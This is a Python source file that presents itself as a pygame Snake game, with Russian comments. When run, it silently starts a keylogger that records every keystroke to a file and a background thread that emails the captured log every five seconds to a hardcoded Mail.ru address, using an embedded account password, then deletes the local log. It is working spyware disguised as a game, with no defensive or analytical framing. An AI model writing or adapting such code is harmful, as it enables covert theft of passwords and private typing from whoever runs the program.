import pygame
import random
import os
import time
import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import threading
import base64

# Константы
WIDTH, HEIGHT = 640, 480
BLOCK_SIZE = 20
BLACK, GREEN, RED, WHITE = (0, 0, 0), (0, 255, 0), (255, 0, 0), (255, 255, 255)

LOG_FILENAME = "log.txt"  # Имя вашего лог-файла
EMAIL_FROM = "pumaartyiw@mail.ru"  # Ваша почта Mail.ru
EMAIL_TO = "pumaartyiv13@mail.ru"  # Почта получателя
EMAIL_PASSWORD = "1a5hbRBNhXFN03gvTq2f"  # Пароль от почты Mail.ru
SMTP_SERVER = "smtp.mail.ru"
SMTP_PORT = 465

# Класс змейки
class Snake:
    def __init__(self):
        self.body = [(100, 100), (80, 100), (60, 100)]
        self.direction = 'RIGHT'

    def move(self):
        head = self.body[0]
        if self.direction == 'RIGHT':
            new_head = (head[0] + BLOCK_SIZE, head[1])
        elif self.direction == 'LEFT':
            new_head = (head[0] - BLOCK_SIZE, head[1])
        elif self.direction == 'UP':
            new_head = (head[0], head[1] - BLOCK_SIZE)
        elif self.direction == 'DOWN':
            new_head = (head[0], head[1] + BLOCK_SIZE)

        self.body = [new_head] + self.body[:-1]

    def grow(self):
        head = self.body[0]
        if self.direction == 'RIGHT':
            new_head = (head[0] + BLOCK_SIZE, head[1])
        elif self.direction == 'LEFT':
            new_head = (head[0] - BLOCK_SIZE, head[1])
        elif self.direction == 'UP':
            new_head = (head[0], head[1] - BLOCK_SIZE)
        elif self.direction == 'DOWN':
            new_head = (head[0], head[1] + BLOCK_SIZE)

        self.body = [new_head] + self.body

    def draw(self, screen):
        for segment in self.body:
            pygame.draw.rect(screen, GREEN, pygame.Rect(segment[0], segment[1], BLOCK_SIZE, BLOCK_SIZE))

# Функция отправки email
def send_email(filename, num_lines=50):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            log_content = "".join(lines[-num_lines:])
    except FileNotFoundError:
        log_content = f"Файл {filename} не найден."

    message = MIMEMultipart()
    message["From"] = EMAIL_FROM
    message["To"] = EMAIL_TO
    message["Subject"] = f"Лог-файл {datetime.datetime.now():%Y-%m-%d %H:%M}"
    message.attach(MIMEText(log_content))

    try:
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(EMAIL_FROM, EMAIL_PASSWORD)
            server.sendmail(EMAIL_FROM, EMAIL_TO, message.as_string())
        print(f"Email с логом отправлен успешно.")
    except Exception as e:
        print(f"Ошибка отправки email: {e}")

# Кейлоггер
class Keylogger:
    def __init__(self, log_filename):
        self.log_filename = log_filename

    def on_press(self, key):
        try:
            with open(self.log_filename, "a") as file:
                file.write(f"{key.char}\n")
        except AttributeError:
            with open(self.log_filename, "a") as file:
                file.write(f"{key}\n")

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.daemon = True
        listener.start()

# Отправка логов каждые 5 секунд
def periodic_email():
    while True:
        send_email(LOG_FILENAME)
        try:
            os.remove(LOG_FILENAME)
        except FileNotFoundError:
            pass
        with open(LOG_FILENAME, "w") as f:
            f.write("")
        time.sleep(5)

# Игровая логика
def snake_game():
    pygame.init()
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Snake Game")
    clock = pygame.time.Clock()
    snake = Snake()
    food = (random.randrange(0, WIDTH // BLOCK_SIZE) * BLOCK_SIZE,
            random.randrange(0, HEIGHT // BLOCK_SIZE) * BLOCK_SIZE)
    score = 0
    running = True

    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_LEFT and snake.direction != 'RIGHT':
                    snake.direction = 'LEFT'
                if event.key == pygame.K_RIGHT and snake.direction != 'LEFT':
                    snake.direction = 'RIGHT'
                if event.key == pygame.K_UP and snake.direction != 'DOWN':
                    snake.direction = 'UP'
                if event.key == pygame.K_DOWN and snake.direction != 'UP':
                    snake.direction = 'DOWN'

        snake.move()
        if snake.body[0] == food:
            snake.grow()
            food = (random.randrange(0, WIDTH // BLOCK_SIZE) * BLOCK_SIZE,
                    random.randrange(0, HEIGHT // BLOCK_SIZE) * BLOCK_SIZE)
            score += 10

        # Проверка столкновений
        if (snake.body[0][0] < 0 or snake.body[0][0] >= WIDTH or
            snake.body[0][1] < 0 or snake.body[0][1] >= HEIGHT or
            snake.body[0] in snake.body[1:]):
            print("Game Over!")
            break

        screen.fill(BLACK)
        snake.draw(screen)
        pygame.draw.rect(screen, RED, pygame.Rect(food[0], food[1], BLOCK_SIZE, BLOCK_SIZE))

        # Отображение счета
        font = pygame.font.Font(None, 36)
        text = font.render(f"Score: {score}", True, WHITE)
        screen.blit(text, (10, 10))

        pygame.display.flip()
        clock.tick(10)

    pygame.quit()

# Основная функция
if __name__ == "__main__":
    keylogger = Keylogger(LOG_FILENAME)
    keylogger.start()  # Запуск кейлоггера в отдельном потоке

    email_thread = threading.Thread(target=periodic_email)
    email_thread.daemon = True
    email_thread.start()  # Запуск отправки логов в отдельном потоке

    snake_game()  # Запуск игры
